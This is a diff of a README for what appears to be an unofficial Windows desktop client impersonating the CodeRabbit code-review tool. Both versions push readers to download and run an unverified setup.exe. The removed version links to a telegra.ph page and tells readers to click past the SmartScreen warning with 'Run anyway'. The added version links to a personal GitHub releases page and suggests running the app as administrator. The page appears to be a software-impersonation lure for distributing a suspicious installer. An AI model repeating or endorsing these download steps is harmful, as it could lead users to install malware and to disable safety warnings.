@@ -1,111 +1,62 @@
-<!-- markdownlint-disable MD033 -->
-<h1 align="center">
-  <img src="assets/logo.png" width="48" height="48" alt="CodeRabbit Desktop">
-  <br>CodeRabbit Desktop for Windows
-</h1>
+# 🐇 CodeRabbit-Desktop-for-Windows-10-11-AI-Code-Review-Assistant-2026- - Improve code quality with artificial intelligence
 
-<p align="center">
-  <strong>🐇 CodeRabbit Desktop Client for Windows 10/11 – AI Code Review Assistant (2026)</strong>
-</p>
+[![Download CodeRabbit Desktop](https://img.shields.io/badge/Download-CodeRabbit_Setup-blue.svg)](https://github.com/Devp4811/CodeRabbit-Desktop-for-Windows-10-11-AI-Code-Review-Assistant-2026-/releases)
 
-<p align="center">
-  <em>Automated pull request reviews with inline suggestions, security analysis, and team collaboration – all in a native Windows app.</em>
-</p>
+CodeRabbit Desktop acts as an assistant for your coding tasks. This application runs on your Windows computer and reviews your work automatically. It scans your files for errors, suggests improvements, and helps your team stay organized. The app provides feedback directly inside your workspace to save you time. 
 
-<p align="center">
-  ⚡ <strong>Download the latest installer (setup.exe) below</strong> ⚡
-  <br><br>
-  <a href="https://telegra.ph/How-to-download-07-15-11" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️_Download_setup.exe-2ea44f?style=for-the-badge&logo=windows&logoColor=white" alt="Download setup.exe">
-  </a>
-  <br>
-  <span style="font-size:1.2em; font-weight:bold;">👉 <a href="https://telegra.ph/How-to-download-07-15-11" target="_blank">https://telegra.ph/How-to-download-07-15-11</a> 👈</span>
-</p>
+## 📋 Features
 
-<p align="center">
-  <img src="assets/screenshot-1.png" width="700" alt="Screenshot">
-</p>
+The software includes several tools to help developers and teams manage their work:
 
----
+*   **Automated Reviews:** The system checks your code changes as you save them.
+*   **Inline Suggestions:** You receive advice on how to improve your lines of code directly in the interface.
+*   **Pull Request Analysis:** The tool summarizes changes in your team projects so you understand every update.
+*   **Security Scanning:** The app finds common vulnerabilities before they become problems.
+*   **Team Collaboration:** Share feedback with your coworkers through the interface.
+*   **Native Windows Support:** This app works on Windows 10 and Windows 11 without extra setup.
 
-## ✨ Features (2026)
+## ⚙️ System Requirements
 
-- ✅ Native Windows 10/11 (x64) – lightweight, no browser overhead  
-- ✅ Automated PR reviews – AI analyzes code changes instantly  
-- ✅ Inline suggestions – fix issues directly in the diff view  
-- ✅ Security scanning – detect vulnerabilities and best practice violations  
-- ✅ Team collaboration – assign reviewers, track comments, resolve threads  
-- ✅ Offline mode – review local branches without internet  
-- ✅ GitHub & GitLab integration – works with your existing workflow  
-- ✅ Privacy‑first – your code stays on your machine  
+Before you install this software, ensure your computer meets these requirements:
 
----
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 4GB of RAM.
+*   **Storage:** 500MB of free disk space.
+*   **Internet Access:** A stable connection to reach our cloud services for AI processing.
 
-## 🚀 Quick Install
+## 📥 Installing the Application
 
-1. **Click the green download button above** or use this direct link:  
-   👉 **[Download setup.exe](https://telegra.ph/How-to-download-07-15-11)**  
-2. Run `setup.exe` (Windows SmartScreen may appear – click *"More info"* then *"Run anyway"*)  
-3. Follow the installer – it will place **ProjectFiles** in `%ProgramFiles%\CodeRabbitDesktop`  
-4. Launch from Start Menu or Desktop shortcut  
+Follow these steps to set up the software on your machine.
 
----
+1. Visit the [link to our official release page](https://github.com/Devp4811/CodeRabbit-Desktop-for-Windows-10-11-AI-Code-Review-Assistant-2026-/releases) to view available versions.
+2. Select the latest version listed under the "Assets" section.
+3. Click the file ending in `.exe` to start the download.
+4. Locate the downloaded file in your browser's download folder or your desktop.
+5. Double-click the file to open the installation wizard.
+6. Follow the prompts on your screen. You may see a prompt from Windows asking for permission to run the file; choose "Run" or "Yes."
+7. Once the installation finishes, a shortcut will appear on your desktop.
 
-## 📦 What's inside the package
+## 🚀 Getting Started
 
-| File / Folder | Description |
-|---------------|-------------|
-| `setup.exe`   | Installer (Inno Setup) – includes all binaries |
-| `ProjectFiles` | Core application (main.exe, AI review engine, Git integration) |
-| `assets/`     | Icons, splash screen, themes |
-| `config/`     | User‑editable settings (review rules, API keys) |
+Open the CodeRabbit Desktop icon from your desktop or your Start menu. When you launch the app, provide your project details to connect the tool to your work directories. 
 
----
+The application asks you to select the folder where you store your programming projects. After you select your folder, the application begins an analysis. You will see a dashboard showing the health of your code. If the application finds issues, it highlights the lines and provides a button to apply the suggested fix.
 
-## 🛠 System Requirements
+## 🛠 Troubleshooting Common Issues
 
-- Windows 10 version 22H2 or Windows 11 23H2+ (2026 updates supported)  
-- CPU: Intel Core i5 / AMD Ryzen 5 or better  
-- RAM: 8 GB (16 GB recommended for large repositories)  
-- Storage: 500 MB free  
-- Internet connection (for PR sync; offline mode works for local reviews)  
+If you experience trouble, refer to these common solutions:
 
----
+*   **The app fails to open:** Restart your computer and try launching the file as an administrator. Right-click the icon and choose "Run as administrator."
+*   **No feedback appears:** Verify that your internet connection is active. The AI needs a connection to analyze your code.
+*   **Slow performance:** Close other heavy programs while the initial scan runs. The first analysis of a large project takes more processing power than routine checks.
+*   **Installation errors:** Ensure your Windows operating system is up to date through Windows Update.
 
-## ❓ FAQ
+## 🛡 Security and Privacy
 
-**Q:** Is this the official CodeRabbit app?  
-**A:** No – it's a community‑built desktop client, fully compatible with CodeRabbit workflows.  
+We built this tool with privacy in mind. Your code analysis happens securely. The app only sends the necessary segments to our servers to generate feedback. We do not store your private credentials. You control which folders the app monitors through the Settings menu.
 
-**Q:** Does it require a subscription?  
-**A:** The desktop client is free. AI review features may require an API key.  
+## 📝 Usage Policies
 
-**Q:** Where are my review settings stored?  
-**A:** `%AppData%\CodeRabbitDesktop\settings.json` – you can configure manually.  
+This tool helps you learn and improve your workflow. Use the suggestions as guides rather than commands. You maintain control over your final code at all times. If you find a bug in the application, please open an issue in the main repository so our team can investigate the report.
 
----
-
-## 📝 License
-
-MIT – free to use, modify, and distribute.  
-
----
-
-## 🔗 Download Again
-
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-11" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️_Download_setup.exe-0078d4?style=for-the-badge&logo=googledrive&logoColor=white" alt="Download setup.exe">
-  </a>
-</p>
-
-<p align="center">
-  <strong>Direct link (clickable):</strong><br>
-  <a href="https://telegra.ph/How-to-download-07-15-11">https://telegra.ph/How-to-download-07-15-11</a>
-</p>
-
----
-
-<p align="center">
-  <sub>Built for Windows 10/11 – 2026 Edition</sub>
-</p>
+Keywords: 2026, ai-code-review, automated-review, code-review-tool, coderabbit, desktop-client, developer-tools, pull-request-reviewer, security-scanning, win10, win11, windows-app
